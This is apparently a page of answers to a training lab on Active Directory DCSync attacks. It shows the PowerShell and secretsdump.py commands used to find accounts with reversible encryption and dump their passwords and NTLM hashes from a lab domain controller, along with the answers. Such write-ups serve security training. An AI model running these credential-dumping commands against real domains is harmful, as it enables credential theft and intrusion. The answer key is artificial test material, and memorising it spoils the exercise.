# Section 22: DCSync

Module: 13. Active Directory Enumeration & Attacks

---

## Questions & Answers

### 1. Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer.

Context:
```powershell
PS C:\Tools> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl


DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : PROXYAGENT
ObjectClass        : user
ObjectGUID         : c72d37d9-e9ff-4e54-9afa-77775eaaf334
SamAccountName     : proxyagent
SID                : S-1-5-21-3842939050-3880317879-2865463114-5222
Surname            :
userAccountControl : 640
UserPrincipalName  :

DistinguishedName  : CN=syncron,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled            : True
GivenName          :
Name               : syncron
ObjectClass        : user
ObjectGUID         : 36857917-0314-49a3-b09f-40415851ea6d
SamAccountName     : syncron
SID                : S-1-5-21-3842939050-3880317879-2865463114-5617
Surname            :
userAccountControl : 640
UserPrincipalName  :
```

**Answer:** `syncron`

---

### 2. What is this user's cleartext password?

Context:
```powershell
─[htb-student@ea-attack01]─[~]
└──╼ $secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 

<SNIP>
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
syncron:CLEARTEXT:Mycleart3xtP@ss!
```

**Answer:** `Mycleart3xtP@ss!`

---

### 3. Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer.

Context:
```powershell
secretsdump.py -outputfile inlanefreight_hashes -just-dc-user khartsfield INLANEFREIGHT/adunn@172.16.5.5 
```

**Answer:** `4bb3b317845f0954200a6b0acc9b9f9a`

---

[Back to Module Index](./README.md)
